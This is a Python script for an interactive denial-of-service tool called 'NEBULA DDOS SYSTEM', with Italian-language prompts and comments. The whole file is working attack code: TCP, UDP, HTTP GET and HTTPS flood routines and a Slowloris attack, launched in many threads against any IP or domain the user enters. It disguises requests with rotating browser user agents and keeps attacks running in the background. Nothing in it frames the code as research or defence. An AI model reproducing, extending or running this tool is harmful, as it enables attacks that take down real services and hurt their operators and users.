import os
import socket
import sys
import threading
import random
import ssl
import time

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
]

def send_packet(ip, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            payload = f"NEBULA_TCP_FLOOD_{random.randint(0, 1000000)}"
            s.send(payload.encode())
            s.close()
        except Exception:
            pass

def send_udp_packet(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024) # Pacchetto da 1KB per più potenza
    while True:
        try:
            s.sendto(payload, (ip, port))
        except Exception:
            pass

def send_http_packet(ip, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            user_agent = random.choice(USER_AGENTS)
            request = f"GET /?{random.randint(0, 10000)} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {user_agent}\r\nConnection: keep-alive\r\n\r\n"
            s.send(request.encode())
            s.close()
        except Exception:
            pass

def send_https_packet(ip, port):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    while True:
        try:
            with socket.create_connection((ip, port), timeout=4) as sock:
                with context.wrap_socket(sock, server_hostname=ip) as ssock:
                    user_agent = random.choice(USER_AGENTS)
                    request = f"GET /?{random.randint(0, 10000)} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {user_agent}\r\n\r\n"
                    ssock.send(request.encode())
        except Exception:
            pass

def slowloris_attack(ip, port):
    list_of_sockets = []
    user_agent = random.choice(USER_AGENTS)
    
    # Inizializzazione socket
    for _ in range(100): # Crea 100 connessioni iniziali
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, port))
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
            s.send(f"User-Agent: {user_agent}\r\n".encode("utf-8"))
            s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
            list_of_sockets.append(s)
        except Exception:
            break

    while True:
        for s in list(list_of_sockets):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
            except socket.error:
                list_of_sockets.remove(s)

        for _ in range(100 - len(list_of_sockets)):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((ip, port))
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
                s.send(f"User-Agent: {user_agent}\r\n".encode("utf-8"))
                s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
                list_of_sockets.append(s)
            except Exception:
                break
        time.sleep(10)

def menu():
    os.system("cls" if os.name == "nt" else "clear")
    # Definizione Colori ANSI
    R = "\033[31m"  # Rosso
    G = "\033[32m"  # Verde
    C = "\033[36m"  # Cyan
    W = "\033[0m"   # Reset
    B = "\033[1m"   # Bold

    banner = rf"""
{R}  _   _ _____ ____  _   _ _        _    
{R} | \ | | ____| __ )| | | | |      / \   
{R} |  \| |  _| |  _ \| | | | |     / _ \  
{R} | |\  | |___| |_) | |_| | |___ / ___ \ 
{R} |_| \_|_____|____/ \___/|_____/_/   \_\ 
{W}
{B}{'='*55}
{G}       [ NEBULA DDOS SYSTEM - POWERED BY PYTHON ]
{B}{'='*55}{W}

{C} [1]{W} TCP Flood           {C}[2]{W} UDP Flood
{C} [3]{W} HTTP GET Flood      {C}[4]{W} HTTPS SSL Flood
{C} [5]{W} Slowloris Attack    {C}[6]{W} DNS Lookup

{R} [7]{W} ESCI DAL PROGRAMMA

{B}{'='*55}{W}
"""
    print(banner)

def main():
    # Inizializza ANSI su Windows
    if os.name == "nt":
        os.system("")

    while True:
        menu()
        try:
            opzione = int(input("\033[32mNEBULA@ROOT\033[0m:~$ "))

            if opzione in [1, 2, 3, 4, 5]:
                target = input("Inserisci l'indirizzo IP o il Dominio del target: ")
                # Risoluzione automatica se è un dominio
                try:
                    ip_target = socket.gethostbyname(target)
                except socket.gaierror:
                    print(f"Errore: Impossibile risolvere '{target}'.")
                    input("Premi Invio per continuare...")
                    continue

                port = int(input("Inserisci la porta del target: "))
                num_threads = int(input("Inserisci il numero di thread (Potenza): "))

                print(f"ATTACCO AVVIATO su {ip_target}:{port}. Chiudi il terminale per fermare.")
                
                target_func = None
                if opzione == 1: target_func = send_packet
                elif opzione == 2: target_func = send_udp_packet
                elif opzione == 3: target_func = send_http_packet
                elif opzione == 4: target_func = send_https_packet
                elif opzione == 5: target_func = slowloris_attack

                for i in range(num_threads):
                    t = threading.Thread(target=target_func, args=(ip_target, port))
                    t.daemon = True # Il thread muore quando chiudi il programma
                    t.start()
                
                print("Tutti i thread sono attivi. Il sistema sta lavorando in background.")
                input("Premi Invio per tornare al menu (l'attacco continuerà)...")

            elif opzione == 6:
                dominio = input("Inserisci il dominio da risolvere: ")
                try:
                    ip_res = socket.gethostbyname(dominio)
                    print(f"L'indirizzo IP di {dominio} è: {ip_res}")
                except socket.gaierror:
                    print("Impossibile risolvere il dominio.")
                input("Premi Invio per continuare...")
            
            elif opzione == 7:
                print("Arrivederci!")
                sys.exit(0)
            else:
                print("Opzione non valida.")
                input("Premi Invio per continuare...")
        except ValueError:
            print("Input non valido. Inserisci un numero.")
            input("Premi Invio per continuare...")

if __name__ == "__main__":
    main()
